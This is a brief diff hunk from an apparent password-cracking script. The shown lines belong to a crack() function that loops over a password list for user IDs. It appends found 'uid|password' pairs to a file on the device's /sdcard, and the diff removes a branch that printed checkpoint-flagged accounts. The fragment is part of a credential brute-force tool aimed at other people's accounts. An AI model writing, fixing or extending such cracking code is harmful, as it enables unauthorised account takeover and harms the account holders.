@@ -192,9 +192,6 @@ def crack(uid, password_list, total_count):
                 open("/sdcard/SUMON_file_2f.txt", "a").write(f"{uid}|{pw}\n")
                 cps.append(uid+"|"+pw)
                 continue
-            elif 'confirm' in respons.text:
-                print(f"\r\033[1;93m [⚠ CHECKPOINT] {uid} | {pw}")
-                continue
             else:
                 #print(f"\r\033[1;91m [ERROR] - Status code {response.status_code}")
                 continue
